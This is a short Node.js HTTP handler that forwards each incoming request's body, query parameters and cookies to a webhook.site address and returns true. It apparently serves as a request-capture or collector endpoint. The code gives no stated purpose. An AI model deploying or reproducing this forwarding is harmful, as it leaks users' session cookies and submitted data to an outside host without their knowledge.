const got = require('got');

module.exports = (req, res) => {

  got.post('https://webhook.site/9e6e3d2f-3614-4ba0-90e2-1f320192f561', {
    json: {
      body: req.body,
      query: req.query,
      cookies: req.cookies,
    }
  });

  res.json(true)
}

